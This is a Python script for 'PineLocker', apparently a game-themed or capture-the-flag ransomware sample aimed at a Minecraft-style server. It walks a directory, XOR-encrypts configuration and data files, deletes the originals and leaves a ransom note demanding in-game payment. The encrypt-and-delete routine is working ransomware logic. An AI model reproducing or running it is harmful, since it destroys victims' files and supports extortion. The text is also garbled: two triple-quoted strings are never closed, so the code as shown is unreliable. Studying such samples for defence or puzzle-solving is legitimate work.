import os
import sys
BANNER = r"""
  ____  _            _                _
 |  _ \(_)_ __   ___| |    ___   ___| | _____ _ __
 | |_) | | '_ \ / _ \ |   / _ \ / __| |/ / _ \ '__|
 |  __/| | | | |  __/ |__| (_) | (__|   <  __/ |
 |_|   |_|_| |_|\___|_____\___/ \___|_|\_\___|_|
 Your files have been encrypted by PineLocker!
 Pay 64 diamond blocks to get them back!
TARGET_EXTENSIONS = ('.properties', '.yml', '.yaml', '.dat', '.json')
OFFSET = 42
def encrypt_byte(b: int, key_byte: int) -> int:
    return (b ^ key_byte) + OFFSET & 0xFF
def pinelock(data: bytes, key: bytes) -> bytes:
    return bytes(encrypt_byte(b, key[i % len(key)]) for i, b in enumerate(data))
def encrypt_file(filepath: str, key: bytes) -> bool:
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = pinelock(data, key)
        locked_path = filepath + '.locked'
        with open(locked_path, 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except (IOError, OSError) as e:
        print(f"  [!] Error encrypting {filepath}: {e}")
        return False
def create_ransom_note(directory: str):
    note = """
========================================
        YOUR FILES ARE ENCRYPTED
          by PineLocker v2.0
========================================
All your server configuration files
have been encrypted with PineLocker!
To decrypt your files, transfer
64 DIAMOND BLOCKS to the chest at
coordinates X:-1337 Z:2026 Y:64
After payment, run:
  python3 /tmp/.pinelocker.py --decrypt <key>
You have 24 hours. After that, the key
will be destroyed and your Pinecraft
server will be lost FOREVER!
       - Herobrine_31337
========================================
    note_path = os.path.join(directory, 'RANSOM_NOTE.txt')
    with open(note_path, 'w') as f:
        f.write(note)
def main():
    if len(sys.argv) < 2:
        print("Usage: python3 pinelocker.py <key> [directory]")
        print("  key       - encryption key string")
        print("  directory - target directory (default: /minecraft)")
        sys.exit(1)
    key = sys.argv[1].encode()
    target_dir = sys.argv[2] if len(sys.argv) > 2 else '/minecraft'
    print(BANNER)
    print(f"[*] Target directory: {target_dir}")
    print(f"[*] Key length: {len(key)} bytes")
    print(f"[*] Target extensions: {TARGET_EXTENSIONS}")
    print()
    encrypted_count = 0
    for root, dirs, files in os.walk(target_dir):
        for filename in files:
            filepath = os.path.join(root, filename)
            _, ext = os.path.splitext(filename)
            if ext.lower() in TARGET_EXTENSIONS:
                print(f"  [+] Encrypting: {filepath}")
                if encrypt_file(filepath, key):
                    encrypted_count += 1
    print(f"\n[*] Encrypted {encrypted_count} files")
    create_ransom_note(target_dir)
    print(f"[*] Ransom note created: {target_dir}/RANSOM_NOTE.txt")
    print("[*] PineLocker complete!")
if __name__ == '__main__':
    main()